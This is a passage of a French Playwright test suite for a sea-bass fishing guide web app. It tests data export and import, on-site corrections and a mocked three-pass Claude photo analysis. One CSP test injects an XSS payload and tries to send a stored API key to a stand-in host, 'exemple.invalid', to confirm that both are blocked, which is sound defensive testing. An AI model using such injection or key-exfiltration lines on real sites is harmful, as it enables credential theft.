  ok(dl.suggestedFilename() === "journal-bar-logonna-daoulas.json" && exported.length === before.length && exported.some((e) => e.lure === "Essai export" && e.heure === "07:40"),
    `journal : export complet (${exported.length} sessions, fichier ${dl.suggestedFilename()})`);
  await a.ctx.close();
  const b = await openApp("logonna");   // téléphone neuf : stockage vide
  await waitText(b.page, READY);
  await tab(b.page, "Journal");
  await b.page.setInputFiles('input[type="file"][accept*="json"]', file);
  await waitText(b.page, /Essai export/, 8000).catch(() => {});
  const after = await b.page.evaluate(() => JSON.parse(localStorage.getItem("bar:journal:logonna-daoulas") || "[]"));
  ok(before.every((e) => after.some((x) => JSON.stringify(x) === JSON.stringify(e))) && /Essai export/.test(await T(b.page)),
    `journal : import sur un téléphone neuf, chaque session retrouvée à l'identique (${before.length} → ${after.length})`);
  ok(!a.errors.length && !b.errors.length, "journal : export et import sans erreur JavaScript");
  await b.ctx.close();
}

// ── 5 quater bis. Toutes mes données : d'une adresse à l'autre (passage à spumy.github.io, 13 nov. 2026) ──
// Le navigateur range le stockage par adresse : deux contextes séparés jouent l'ancienne et la nouvelle adresse.
{
  const L = (s) => `[transfert] ${s}`;
  const a = await openApp("logonna");
  await waitText(a.page, READY);
  await a.page.evaluate(async () => {
    const J = (k, v) => localStorage.setItem(k, JSON.stringify(v));
    J("bar:journal:logonna-daoulas", [{ id: "t1", spotId: "moulinmer", date: "2025-12-27", fish: 2, lure: "Asturie 130 blanc" }, { id: "t2", spotId: "moulinmer", date: "2026-08-08", fish: 1, lure: "Z-Claw blanc nacré" }]);
    J("bar:journal:pirou-plage", [{ id: "p1", spotId: "agon", date: "2026-07-01", fish: 0, lure: "Patchinko 140" }]);
    J("bar:myspots:logonna-daoulas", [{ id: "moi-abcd1234", name: "Mon poste", lat: 48.33, lon: -4.3, water: 90, createdAt: 1, updatedAt: 1 }]);
    localStorage.setItem("bar:theme", "sun");
    localStorage.setItem("bar:boite", JSON.stringify({ essai: true }));
    J("bar:sync", { owner: "spumy", repo: "journal", token: "github_pat_SECRET" });
    localStorage.setItem("bar:claude", "sk-ant-SECRET");
    localStorage.setItem("bar:data:essai", "{}");
    await new Promise((ok, ko) => { const r = indexedDB.open("guide-bar", 1); r.onupgradeneeded = () => r.result.createObjectStore("kv");
      r.onsuccess = () => { const tx = r.result.transaction("kv", "readwrite"); tx.objectStore("kv").put([{ id: "ph1", spotId: "moulinmer", photos: [{ thumb: "data:image/jpeg;base64,/9j/", when: null }] }], "photos:logonna-daoulas"); tx.oncomplete = ok; tx.onerror = ko; }; r.onerror = ko; });
  });
  await a.page.evaluate(() => window.dispatchEvent(new Event("bar:reglages")));
  const [dl] = await Promise.all([a.page.waitForEvent("download"), btn(a.page, /^Enregistrer toutes mes données$/).click()]);
  const file = path.join(SHOTS, "toutes-mes-donnees.json");
  await dl.saveAs(file);
  const d = JSON.parse(fs.readFileSync(file, "utf8"));
  const ls = d.localStorage || {};
  ok(d.format === "spumy/donnees" && d.version === 1 && /^spumy-donnees-\d{4}-\d{2}-\d{2}\.json$/.test(dl.suggestedFilename()), L(`fichier « ${dl.suggestedFilename()} », format spumy/donnees`));
  ok(JSON.parse(ls["bar:journal:logonna-daoulas"] || "[]").length === 2 && JSON.parse(ls["bar:journal:pirou-plage"] || "[]").length === 1 && ls["bar:myspots:logonna-daoulas"] && ls["bar:boite"] && ls["bar:theme"] === "sun"
    && (d.indexedDB?.["photos:logonna-daoulas"] || []).length === 1, L("le fichier contient le journal des deux guides, tes spots, ta boîte, tes réglages et l'analyse photo"));
  ok(!Object.keys(ls).some((k) => /^bar:(sync|claude|data:)/.test(k)) && !/SECRET/.test(fs.readFileSync(file, "utf8")), L("ni le jeton GitHub, ni la clé Claude, ni la météo en cache ne voyagent"));
  ok(/3 sessions au journal/.test(await T(a.page)), L("le guide dit ce qu'il a enregistré"));
  await a.ctx.close();

  const b = await openApp("logonna");   // nouvelle adresse : stockage vide, sauf une session et un réglage déjà là
  await waitText(b.page, READY);
  await b.page.evaluate(() => { localStorage.setItem("bar:journal:logonna-daoulas", JSON.stringify([{ id: "b1", spotId: "moulinmer", date: "2026-11-01", fish: 0 }])); localStorage.setItem("bar:theme", "nuit"); });
  await b.page.evaluate(() => window.dispatchEvent(new Event("bar:reglages")));
  await b.page.setInputFiles('input[aria-label="Fichier de données à importer"]', file);
  await waitText(b.page, /Importé :/, 8000).catch(() => {});
  const got = await b.page.evaluate(async () => ({
    j: JSON.parse(localStorage.getItem("bar:journal:logonna-daoulas") || "[]").map((e) => e.id).sort().join(),
    p: JSON.parse(localStorage.getItem("bar:journal:pirou-plage") || "[]").length,
    s: JSON.parse(localStorage.getItem("bar:myspots:logonna-daoulas") || "[]").length,
    theme: localStorage.getItem("bar:theme"), boite: localStorage.getItem("bar:boite"),
    secret: !!localStorage.getItem("bar:sync") || !!localStorage.getItem("bar:claude"),
    photos: await new Promise((ok) => { const r = indexedDB.open("guide-bar"); r.onsuccess = () => { try { const q = r.result.transaction("kv").objectStore("kv").get("photos:logonna-daoulas"); q.onsuccess = () => ok((q.result || []).length); q.onerror = () => ok(-1); } catch { ok(-2); } }; r.onerror = () => ok(-3); }),
  }));
  ok(got.j === "b1,t1,t2" && got.p === 1 && got.s === 1 && got.boite && got.photos === 1, L(`import : journal fusionné (${got.j}), Pirou ${got.p}, spots ${got.s}, analyse photo ${got.photos}`));
  ok(got.theme === "nuit" && !got.secret, L("import : le réglage déjà présent est gardé, aucun secret importé"));
  ok(/Importé : 3 sessions ajoutées au journal/.test(await T(b.page)), L("import : le guide dit ce qu'il a ajouté (2 à Logonna, 1 à Pirou)"));
  await b.page.setInputFiles('input[aria-label="Fichier de données à importer"]', file);
  await waitText(b.page, /Importé : 0 session/, 8000).catch(() => {});
  ok(/Importé : 0 session ajoutée/.test(await T(b.page)) && (await b.page.evaluate(() => JSON.parse(localStorage.getItem("bar:journal:logonna-daoulas") || "[]").length)) === 3, L("importer deux fois le même fichier n'ajoute rien"));
  const one = path.join(SHOTS, "journal-un-guide.json"); fs.writeFileSync(one, JSON.stringify([{ id: "x", spotId: "moulinmer", date: "2026-01-01" }]));
  await b.page.setInputFiles('input[aria-label="Fichier de données à importer"]', one);
  await waitText(b.page, /journal d'un seul guide/, 8000).catch(() => {});
  ok(/journal d'un seul guide/.test(await T(b.page)), L("un journal d'un seul guide est reconnu et renvoyé vers l'onglet Journal"));
  await btn(b.page, /^Recharger pour voir tes données$/).click();
  await waitText(b.page, READY);
  await tab(b.page, "Journal");
  await waitText(b.page, /Z-Claw blanc nacré/, 8000).catch(() => {});
  ok(/Z-Claw blanc nacré/.test(await T(b.page)), L("après rechargement, les sessions importées sont dans le journal"));
  ok(!a.errors.length && !b.errors.length, L("aucune erreur JavaScript"));
  await b.ctx.close();
}

// ── 5 ter. Sécurité : la politique CSP bloque une injection et une fuite de données ──
// (contexte non surveillé : les violations provoquées ici sont voulues)
{
  const { ctx, page } = await openApp("logonna", { context: await _newContext({ ...devices["iPhone 13"], locale: "fr-FR", timezoneId: "Europe/Paris", serviceWorkers: "block" }) });
  await waitText(page, WX);
  const csp = await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || "");
  // Lot 3.5 : la page d'un guide n'a plus aucun script en ligne ; seul app.js, servi par le site lui-même, s'exécute.
  const scriptSrc = (csp.split(";").find((x) => /script-src/.test(x)) || "").trim();
  ok(scriptSrc === "script-src 'self'" && /connect-src 'self' https:\/\/api\.open-meteo\.com/.test(csp)
    && await page.evaluate(() => document.querySelectorAll("script:not([src])").length === 0 && [...document.scripts].map((s) => s.getAttribute("src")).join() === "app.js"),
  "[sécurité] CSP : aucun script en ligne, seul app.js du site ; connexions limitées" + ` — ${scriptSrc}`);
  const r = await page.evaluate(async () => {
    const seen = [];
    document.addEventListener("securitypolicyviolation", (e) => seen.push(e.violatedDirective));
    document.body.insertAdjacentHTML("beforeend", '<img src="x" onerror="window.__xss = 1">');
    const s = document.createElement("script"); s.textContent = "window.__xss2 = 1"; document.body.appendChild(s);
    let leaked = true;
    try { await fetch("https://exemple.invalid/?k=" + encodeURIComponent(localStorage.getItem("bar:claude") || "")); } catch { leaked = false; }
    await new Promise((ok) => setTimeout(ok, 300));
    return { xss: window.__xss === 1 || window.__xss2 === 1, leaked, seen };
  });
  ok(!r.xss, "[sécurité] un script injecté dans la page ne s'exécute pas");
  ok(!r.leaked && r.seen.some((d) => /connect-src/.test(d)), "[sécurité] envoi vers un domaine inconnu bloqué (connect-src)");
  await ctx.close();
}

// ── 5 bis. Corrections sur place : profondeur, eau du jour, boîte, journal structuré ──
{
  const { ctx, page, errors } = await openApp("logonna");
  const L = (s) => `[terrain] ${s}`;
  await waitText(page, WX);
  // Profondeur donnée pour le spot actif
  await tab(page, "Spots");
  await btn(page, /^Terrain$/).click();
  await page.fill('input[aria-label="Profondeur en mètres à mi-marée"]', "6");
  await page.getByRole("button", { name: "Enregistrer", exact: true }).first().click();
  await page.waitForTimeout(300);
  ok(/6 m à mi-marée \(donné par toi\)/.test(await T(page)) && /Corrigé le .*\(profondeur\), par toi, sur place/.test(await T(page)), L("profondeur donnée sur place : affichée et tracée"));
  const spotName = await page.evaluate(() => document.querySelector("h2")?.textContent || "");
  // Eau du jour, dans l'onglet Leurres, pour ce même spot
  await tab(page, "Leurres");
  ok((await page.inputValue('select[aria-label="Spot"]')) && new RegExp(spotName.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")).test(await T(page)), L("onglet Leurres : même spot que la fiche"));
  ok(/donné par toi/.test(await T(page)), L("leurres : la profondeur donnée sert au conseil"));
  await page.getByRole("button", { name: "chargée", exact: true }).click();
  await page.waitForTimeout(300);
  ok(/Eau chargée : observée par toi aujourd'hui/.test(await T(page)) && /💧 eau chargée/.test(await T(page)), L("eau observée : remplace l'estimation"));
  // Boîte corrigée : poids pesé et nage du balsa
  await page.getByText("Corriger ta boîte").click();
  await page.fill('input[aria-label="Poids pesé Xorus Asturie 130"]', "26");
  await page.locator('input[aria-label="Poids pesé Xorus Asturie 130"]').blur();
  await page.selectOption('select[aria-label="Nage du leurre balsa"]', "sous-surface");
  await page.waitForTimeout(300);
  await page.getByText("Fiches techniques de ta boîte").click();
  const tx = await T(page);
  ok(/26 g pesé par toi \(fiche : 27 g\)/.test(tx) && /poisson nageur en balsa, nage sous la surface/.test(tx), L("boîte corrigée : poids pesé et nage du balsa affichés"));
  const box = await page.evaluate(() => JSON.parse(localStorage.getItem("bar:boite") || "{}"));
  ok(box.poids?.["asturie:130"] === 26 && box.balsa?.nage === "sous-surface", L("boîte corrigée : enregistrée, commune aux deux guides"));
  ok(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth), L("aucun défilement horizontal, même avec les étiquettes longues (profondeur donnée)"));
  // Journal : leurre choisi dans la boîte, avec poids et couleur
  await tab(page, "Journal");
  await page.selectOption('select[aria-label="Leurre principal"]', { label: "Sakura Mr Joe 120" });
  ok((await page.inputValue('input[aria-label="Poids ou tête du leurre"]')) === "35 g", L("journal : poids prérempli d'après la fiche"));
  await page.fill('input[aria-label="Couleur du leurre"]', "Blanc");
  await page.fill('input[type="time"]', "18:30");
  await page.fill('input[type="number"]', "2");
  await btn(page, /^Enregistrer$/).click();
  await page.waitForTimeout(500);
  const j = await page.evaluate(() => Object.keys(localStorage).filter((k) => k.startsWith("bar:journal:")).flatMap((k) => JSON.parse(localStorage.getItem(k) || "[]")));
  const e = j.find((x) => x.lureRef?.cat === "mrjoe");
  ok(e && e.lureRef.len === 120 && e.lureW === "35 g" && e.lureColor === "Blanc" && /Sakura Mr Joe 120 · 35 g · Blanc/.test(e.lure) && e.fish === 2, L("journal : leurre structuré enregistré (modèle, poids, couleur, prises)"));
  // Après rechargement, tout est conservé
  await page.reload(); await waitText(page, /Nouvelle session/);
  await tab(page, "Leurres");
  ok(/Eau chargée : observée par toi aujourd'hui/.test(await T(page)) && /donné par toi/.test(await T(page)), L("rechargement : eau du jour et profondeur conservées"));
  ok(errors.length === 0, L("aucune erreur JavaScript") + (errors.length ? " — " + errors.join(" | ") : ""));
  await ctx.close();
}

// ── 6. Analyse photo (API Anthropic simulée) ──
{
  const PH = path.join(ROOT, "tests/ref/photos");
  const cors = { "access-control-allow-origin": "*", "access-control-allow-headers": "*", "access-control-allow-methods": "GET, POST, OPTIONS" };
  const reply = (o, usage = { input_tokens: 12000, output_tokens: 3000 }) => ({ model: "claude-opus-5-5", stop_reason: "end_turn", usage,
    content: [{ type: "thinking", thinking: "…" }, { type: "text", text: JSON.stringify(o) }] });
  const PASS1 = { photos: [{ photo: 1, vue: "Pointe rocheuse vue du haut de la grève", qualite: "bonne", limites: "contre-jour à droite" }, { photo: 2, vue: "Anse vue de face", qualite: "moyenne", limites: "" }],
    observations: [
      { photo: 1, zone: "premier plan gauche", x: 22, y: 78, categorie: "roche", fait: "Platier rocheux découvert, couvert d'algues brunes", confiance: "elevee" },
      { photo: 1, zone: "plan moyen, centre", x: 50, y: 52, categorie: "surface_eau", fait: "Ligne d'écume allongée parallèle à la pointe", confiance: "moyenne" },
      { photo: 2, zone: "centre", x: 48, y: 70, categorie: "vegetation", fait: "Taches sombres sous la surface, peut-être un herbier", confiance: "faible" },
      { photo: 2, zone: "arrière-plan droit", x: 85, y: 30, categorie: "vie", fait: "Oiseaux plongeant en groupe", confiance: "faible" },
      { photo: 7, zone: "centre", x: 50, y: 50, categorie: "roche", fait: "Photo qui n'existe pas", confiance: "elevee" }],
    non_visible: ["Profondeur au pied du platier", "Nature du fond hors des zones découvertes"] };
  const PASS2 = { verdicts: [{ id: "o1", statut: "confirme", raison: "Net au premier plan" }, { id: "o2", statut: "confirme", raison: "Visible" },
    { id: "o3", statut: "douteux", raison: "Reflets possibles" }, { id: "o4", statut: "absent", raison: "Aucun oiseau visible" }] };
  const PASS3 = { synthese: "Pointe rocheuse avec une veine marquée le long du platier.",
    lecture: [{ titre: "Courant", texte: "La ligne d'écume signale une veine le long de la pointe.", nature: "deduit", refs: ["o2"] }],
    postes: [{ nom: "Bordure du platier", emplacement: "photo 1, premier plan gauche", pourquoi: "Rupture roche-eau au bord de la veine.", moment: "à la marée de la photo", confiance: "moyenne", refs: ["o1", "o2", "t1"] },
      { nom: "Herbier", emplacement: "photo 2, centre", pourquoi: "Abri possible.", moment: "non déterminable avec ces photos", confiance: "faible", refs: ["o3"] },
      { nom: "Chasse", emplacement: "photo 2", pourquoi: "Oiseaux.", moment: "maintenant", confiance: "elevee", refs: ["o4"] }],
    approche: [{ texte: "Lancer en biais vers la ligne d'écume, depuis le haut du platier.", refs: ["o1", "o2"] }],
    securite: [{ texte: "Algues glissantes sur le platier.", refs: ["o1"] }],
    accroche: { niveau: "fort", raison: "Platier rocheux et algues jusqu'au bord.", refs: ["o1", "f2"] },
    leurres: [{ famille: "surface", pourquoi: "Passer au-dessus des algues, le long de la veine.", refs: ["o1", "o2"] }],
    fiche: [{ point: "Fond", fiche_dit: "roches et goémon", photos_montrent: "platier couvert d'algues", accord: "accord", refs: ["f2", "o1"] }],
    a_verifier: ["Profondeur au pied du platier à basse mer"],
    propositions: [{ champ: "couches", valeur: "surface", raison: "Algues jusqu'à la surface sur tout le platier visible.", refs: ["o1", "o2"] },
      { champ: "encombrement", valeur: "2", raison: "Herbier possible.", refs: ["o3"] },
      { champ: "gratter", valeur: "bof", raison: "?", refs: ["o1"] }] };
  const api = { reqs: [], fail: null, delay: {}, n: { 1: 0, 2: 0, 3: 0 } };
  const ctx = await browser.newContext({ ...devices["iPhone 13"], locale: "fr-FR", timezoneId: "Europe/Paris", serviceWorkers: "block", permissions: ["clipboard-read", "clipboard-write"] });
  await ctx.route(/api\.anthropic\.com/, async (route) => {
    const req = route.request();
    if (req.method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
    const h = req.headers(); const u = new URL(req.url());
    const key = h["x-api-key"];
    if (u.pathname === "/v1/models") return route.fulfill({ status: key === "sk-ant-test" ? 200 : 401, headers: cors, contentType: "application/json", body: JSON.stringify(key === "sk-ant-test" ? { data: [] } : { error: { type: "authentication_error", message: "invalid x-api-key" } }) });
    const body = JSON.parse(req.postData());
    const pass = /^Tu es l'œil/.test(body.system) ? 1 : /^Tu es un contrôleur/.test(body.system) ? 2 : 3;
    api.reqs.push({ h, body, pass }); api.n[pass]++;
    if (api.delay[pass]) await new Promise((r) => setTimeout(r, api.delay[pass]));
    const f = api.fail && (api.fail.pass == null || api.fail.pass === pass) ? api.fail : null;
    try {
      if (f) return await route.fulfill({ status: f.status, headers: cors, contentType: "application/json", body: JSON.stringify(f.body) });
      return await route.fulfill({ status: 200, headers: cors, contentType: "application/json", body: JSON.stringify(reply(pass === 1 ? PASS1 : pass === 2 ? PASS2 : PASS3)) });
    } catch { /* page rechargée pendant la réponse */ }
  });
  const { page, errors } = await openApp("logonna", { context: ctx });
  const L = (s) => `[photo] ${s}`;
  const choose = (files) => page.setInputFiles('input[aria-label="Photos du spot"]', files.map((f) => path.join(PH, f)));
  await waitText(page, WX);
  await tab(page, "Photos");
  ok(/Méthode en trois passes/.test(await T(page)) && /Clé API Claude/.test(await T(page)), L("onglet Photos : méthode expliquée, clé demandée"));
  ok(await page.getByRole("link", { name: /Créer une clé sur platform\.claude\.com/ }).getAttribute("href") === "https://platform.claude.com/settings/keys", L("lien direct vers la création de la clé"));
  ok(await page.getByRole("link", { name: /Ajouter du crédit/ }).getAttribute("href") === "https://platform.claude.com/settings/billing", L("lien direct vers l'achat de crédit"));
  await page.fill('input[type=password]', "sk-ant-mauvaise");
  await btn(page, "Enregistrer et tester").click();
  await waitText(page, /Clé API refusée/, 5000).catch(() => {});
  ok(/Clé API refusée/.test(await T(page)) && !(await page.evaluate(() => localStorage.getItem("bar:claude"))), L("clé refusée : message clair, rien d'enregistré"));
  await page.fill('input[type=password]', "sk-ant-test");
  await btn(page, "Enregistrer et tester").click();
  await waitText(page, /Nouvelle analyse/, 5000);
  // Lot 3.8 : par défaut, la clé ne reste que le temps de la session (rien dans le stockage durable).
  const keyAt = () => page.evaluate(() => ({ ls: localStorage.getItem("bar:claude"), ss: sessionStorage.getItem("bar:claude:session") }));
  const k1 = await keyAt();
  ok(k1.ss === "sk-ant-test" && !/sk-ant/.test(k1.ls || ""),
    L("[sécurité] clé acceptée : gardée le temps de la session seulement, rien dans le stockage durable") + ` — ${JSON.stringify(k1)}`);
  await choose(["exif_complet.jpg", "sans_exif_grande.jpg"]);
  await waitText(page, /Photo 2 ·/, 10000);
  const t1 = await T(page);
  ok(/Photo 1 · 14\/10\/2026 à 18h40/.test(t1) && /date de prise de vue de la photo/.test(t1) && /position GPS lue/.test(t1), L("photo 1 : date EXIF et position lues"));
  ok(/Photo 1 prise à 0,1 km du spot le plus proche : Moulin Mer/.test(t1), L("photo 1 : spot le plus proche proposé d'après la position"));
  ok(/date du fichier/.test(t1) && /Heure de prise de vue des photos sans date/.test(t1), L("photo 2 sans EXIF : date du fichier signalée, heure à saisir proposée"));
  ok(/coût estimé : \d+,\d\d \$ à \d+,\d\d \$/.test(t1), L("coût estimé affiché avant l'analyse"));
  if (await page.getByRole("button", { name: "Choisir ce spot" }).count()) await btn(page, "Choisir ce spot").click();
  await page.fill('input[type=datetime-local]', "2026-10-14T19:30");
  await page.fill("textarea", "Fond de roches, 2 bars pris ici en décembre.");
  // La sélection survit à un changement d'onglet
  await tab(page, "Marée"); await tab(page, "Photos");
  ok(/Photo 2 ·/.test(await T(page)) && await page.$eval('select[aria-label="Spot analysé"]', (s) => s.value) === "moulinmer" && await page.$eval("textarea", (x) => x.value) === "Fond de roches, 2 bars pris ici en décembre.", L("photos, spot et notes gardés après un changement d'onglet"));
  // L'analyse continue quand on quitte l'onglet ; un bandeau la suit et annonce la fin
  api.delay = { 1: 1500, 2: 1500 };
  await btn(page, "Analyser").click();
  await waitText(page, /Passe 1 sur 3/, 5000);
  await tab(page, "Synthèse");
  await waitText(page, /Analyse photo · passe \d\/3 en cours/, 5000).catch(() => {});
  ok(/Analyse photo · passe \d\/3 en cours/.test(await T(page)), L("autre onglet : bandeau « analyse en cours »"));
  await waitText(page, /Analyse photo prête/, 15000).catch(() => {});
  ok(/Analyse photo prête/.test(await T(page)), L("autre onglet : l'analyse a continué jusqu'au bout"));
  await btn(page, "Voir").click();
  await waitText(page, /Lecture du spot/, 5000);
  api.delay = {};
  await page.screenshot({ path: path.join(SHOTS, "photos-resultat-logonna.png"), fullPage: true });
  const t2 = await T(page);
  ok(!/Analyse photo prête/.test(t2), L("résultat vu : bandeau retiré"));
  const [q1, q2, q3] = api.reqs;
  ok(api.reqs.length === 3 && q1.h["anthropic-dangerous-direct-browser-access"] === "true" && q1.h["x-api-key"] === "sk-ant-test" && q1.body.model === "claude-opus-5-5", L("3 appels, clé et en-tête d'accès direct, modèle Opus 5.5"));
  const imgs = q1.body.messages[0].content.filter((b) => b.type === "image");
  const dims = imgs.map((b) => { const buf = Buffer.from(b.source.data, "base64"); let p = 2; while (p < buf.length) { const mk = buf[p + 1], len = buf.readUInt16BE(p + 2); if (mk >= 0xc0 && mk <= 0xc2) return { h: buf.readUInt16BE(p + 5), w: buf.readUInt16BE(p + 7), exif: buf.includes(Buffer.from("Exif")) }; p += 2 + len; } return null; });
  ok(imgs.length === 2 && dims.every((d) => d && Math.max(d.w, d.h) <= 2000) && Math.max(dims[1].w, dims[1].h) === 2000, L(`images réduites à 2000 px au plus (${dims.map((d) => d && `${d.w}×${d.h}`).join(", ")})`));
  ok(dims.every((d) => d && !d.exif), L("images envoyées sans métadonnées (ni date ni position)"));
  ok(q2.body.messages[0].content.filter((b) => b.type === "image").length === 2 && /o4 · photo 2 · arrière-plan droit \(≈ x 85 %, y 30 %\)/.test(q2.body.messages[0].content.at(-1).text) && !/o5/.test(q2.body.messages[0].content.at(-1).text), L("vérification : photos renvoyées avec positions ; observation hors photo écartée"));
  const q3t = q3.body.messages[0].content.map((b) => b.text || "").join("");
  ok(!q3.body.messages[0].content.some((b) => b.type === "image") && /t1 · Photo 1 : prise le 14\/10\/2026 à 18h40/.test(q3t) && /Marée (montante|descendante)/.test(q3t) && /t2 · Photo 2 : prise le 14\/10\/2026 à 19h30 \(heure saisie par toi\)/.test(q3t), L("lecture : texte seul, marée calculée pour chaque heure de prise de vue"));
  ok(/f2 · Fond/.test(q3t) && /u1 · Fond de roches/.test(q3t) && !/o4 ·/.test(q3t) && /o3 · .*INCERTAIN/.test(q3t), L("lecture : fiche, notes, observation écartée absente, incertaine signalée"));
  ok(q1.body.output_config?.format?.type === "json_schema" && q1.body.output_config.effort === "high", L("sorties structurées demandées"));
  ok(/Pointe rocheuse avec une veine marquée/.test(t2) && /Bordure du platier/.test(t2), L("compte rendu : synthèse et poste fondé affichés"));
  const head = t2.split("Tous les faits")[0];
  ok(!/Herbier\n/.test(head) && !/Chasse\n/.test(head), L("postes fondés sur un fait incertain ou écarté : non affichés"));
  ok(/2 faits confirmés/.test(t2) && /1 incertain\b/.test(t2) && /5 écartés/.test(t2), L("compteurs : confirmés, incertains, écartés"));
  ok(/Risque d'accroche : fort/.test(t2) && /Stickbait : Passer au-dessus des algues/.test(t2) && /✓ Fond/.test(t2), L("accroches, leurres et confrontation avec la fiche"));
  ok(/Ce que les photos ne disent pas/.test(t2) && /Profondeur au pied du platier/.test(t2) && /À vérifier sur place/.test(t2), L("limites des photos et vérifications listées"));
  ok(/0,\d\d \$ · \d+:\d\d/.test(t2), L("coût réel et durée affichés"));
  // Faits ouverts sur place
  await page.getByRole("button", { name: "Fait t1", exact: true }).first().click();
  await page.waitForTimeout(200);
  ok(/t1 · Photo 1 : prise le 14\/10\/2026 à 18h40/.test(await T(page)) && await page.getByRole("button", { name: "Fait t1", exact: true }).first().getAttribute("aria-expanded") === "true", L("repère t1 : le fait s'affiche sous l'élément, sans quitter la lecture"));
  await page.getByRole("button", { name: "Fait o1", exact: true }).first().click();
  await page.waitForTimeout(200);
  ok(await page.getByRole("button", { name: "Voir o1 sur la photo 1" }).count() > 0, L("repère o1 : la photo et la zone apparaissent avec le fait"));
  // Visionneuse plein écran
  await page.getByRole("button", { name: "Agrandir la photo 1" }).click();
  await page.waitForSelector('[role=dialog][aria-modal=true]');
  const dlg = await page.evaluate(() => { const d = document.querySelector("[role=dialog]"); return { txt: d.innerText, o1: !!d.querySelector('[aria-label="Repère o1"]'), p1: !!d.querySelector('[aria-label^="Poste P1"]'), focus: document.activeElement?.getAttribute("aria-label") }; });
  await page.screenshot({ path: path.join(SHOTS, "photos-plein-ecran.png") });
  ok(/Photo 1 \/ 2/.test(dlg.txt) && dlg.o1 && dlg.p1 && /positions approximatives/.test(dlg.txt) && dlg.focus === "Fermer", L("plein écran : photo, repères des observations et du poste P1, positions dites approximatives"));
  await page.getByRole("button", { name: "Photo suivante" }).click();
  ok(/Photo 2 \/ 2/.test(await page.evaluate(() => document.querySelector("[role=dialog]").innerText)), L("plein écran : photo suivante"));
  await page.keyboard.press("Escape");
  ok(!(await page.$("[role=dialog]")), L("plein écran : fermé par Échap"));
  // Propositions pour la fiche
  ok(/Proposé pour la fiche du spot/.test(t2) && /Couches pêchables : surface/.test(t2) && !/Encombrement 2\/3/.test(t2), L("propositions : seule celle fondée sur un fait confirmé est proposée"));
  await btn(page, "Appliquer à la fiche").click();
  await page.waitForTimeout(300);
  const ov = JSON.parse(await page.evaluate(() => localStorage.getItem("bar:terrain:logonna-daoulas")));
  ok(ov?.moulinmer?.couches?.join() === "surface" && /✓ Appliqué à la fiche/.test(await T(page)), L("proposition appliquée : enregistrée sur l'appareil"));
  await tab(page, "Spots");
  if (await page.getByRole("button", { name: /^Voir les \d+/ }).count()) await btn(page, /^Voir les \d+/).click();
  await page.getByRole("button", { name: /Moulin Mer/ }).first().click();
  await page.waitForTimeout(400);
  await btn(page, /^Terrain$/).click();
  await page.waitForTimeout(300);
  const sp = await T(page);
  ok(/Corrigé le .*\(couches\), d.après une analyse photo validée par toi/.test(sp) && /Couches à pêcher : surface\./.test(sp), L("fiche du spot : correction affichée, avec sa trace"));
  await tab(page, "Photos");
  await btn(page, "Annuler").click();
  await page.waitForTimeout(300);
  ok(!JSON.parse(await page.evaluate(() => localStorage.getItem("bar:terrain:logonna-daoulas")) || "{}").moulinmer, L("correction annulée : la fiche revient à l'origine"));
  await btn(page, "Copier le compte rendu").click();
  await page.waitForTimeout(300);
  const clip = await page.evaluate(() => navigator.clipboard.readText()).catch(() => "");
  ok(/Analyse photo — Moulin Mer/.test(clip) && /\[o1, o2, t1\]/.test(clip), L("compte rendu copié avec ses références"));
  // Rechargement pendant une analyse : reprise à la passe manquante, sans refaire les autres
  api.reqs.length = 0; api.n = { 1: 0, 2: 0, 3: 0 }; api.delay = { 2: 6000 };
  await choose(["exif_sans_fuseau.jpg"]);
  await waitText(page, /Photo 1 ·/, 10000);
  await btn(page, "Analyser").click();
  await waitText(page, /Passe 2 sur 3/, 8000);
  await page.screenshot({ path: path.join(SHOTS, "photos-en-cours.png"), fullPage: true });
  await page.reload();   // l'adresse garde #photos : l'onglet Photos rouvre directement
  await waitText(page, /Reprendre à la passe 2/, 10000).catch(() => {});
  const tr = await T(page);
  ok(/Analyse interrompue/.test(tr) && /Reprendre à la passe 2/.test(tr) && /Inventaire, pas encore vérifié/.test(tr), L("après rechargement : analyse interrompue, inventaire gardé, reprise proposée"));
  api.delay = {};
  await btn(page, "Reprendre à la passe 2").click();
  await waitText(page, /Lecture du spot/, 15000);
  ok(api.n[1] === 1 && api.n[2] === 2 && api.n[3] === 1, L(`reprise : la passe 1 n'est pas refaite (passes envoyées ${api.n[1]}/${api.n[2]}/${api.n[3]})`));
  // Erreur à la dernière passe : reprise de la seule passe 3
  api.n = { 1: 0, 2: 0, 3: 0 };
  api.fail = { pass: 3, status: 400, body: { error: { type: "invalid_request_error", message: "Your credit balance is too low to access the Anthropic API." } } };
  await choose(["exif_complet.jpg"]);
  await waitText(page, /Photo 1 ·/, 10000);
  await btn(page, "Analyser").click();
  await waitText(page, /Crédit API épuisé/, 10000).catch(() => {});
  const te = await T(page);
  ok(/Crédit API épuisé/.test(te) && /Déjà facturé : \d+,\d\d \$/.test(te) && /Reprendre à la passe 3/.test(te), L("crédit épuisé à la passe 3 : message clair, coût déjà engagé, reprise proposée"));
  api.fail = null;
  await btn(page, "Reprendre à la passe 3").click();
  await waitText(page, /Lecture du spot/, 15000);
  ok(api.n[1] === 1 && api.n[2] === 1 && api.n[3] === 2, L("reprise : seule la passe 3 est refaite"));
  // Historique
  await page.reload();
  await waitText(page, /Analyses enregistrées/, 10000);
  const opens = page.getByRole("button", { name: /^Moulin Mer\s*photos du/ });
  const histTxt = (await T(page)).split("Analyses enregistrées")[1] || "";
  ok((await opens.count()) === 3 && /2 photos/.test(histTxt), L(`analyses conservées après rechargement (${await opens.count()}) — ${histTxt.replace(/\n+/g, " | ").slice(0, 400)}`));
  await opens.last().click();
  // 12 s : sur une machine lente, rouvrir une analyse (vignettes comprises) a dépassé 5 s, 2 fois sur 5 passages locaux.
  await waitText(page, /Bordure du platier/, 12000);
  ok(true, L("analyse enregistrée rouverte"));
  // Lot 3.8 : « Garder la clé sur ce téléphone » la met dans le stockage durable ; décochée, elle en ressort.
  await page.getByText("Clé API et modèle").first().click(); await page.waitForTimeout(200);
  ok(/Clé gardée le temps de la session \(oubliée à la fermeture de l'application\)/.test(await T(page)), L("clé : l'écran dit qu'elle n'est gardée que le temps de la session"));
  const keep = page.getByRole("checkbox", { name: /Garder la clé sur ce téléphone/ });
  await keep.check(); await page.waitForTimeout(200);
  const k2 = await keyAt();
  await keep.uncheck(); await page.waitForTimeout(200);
  const k3 = await keyAt();
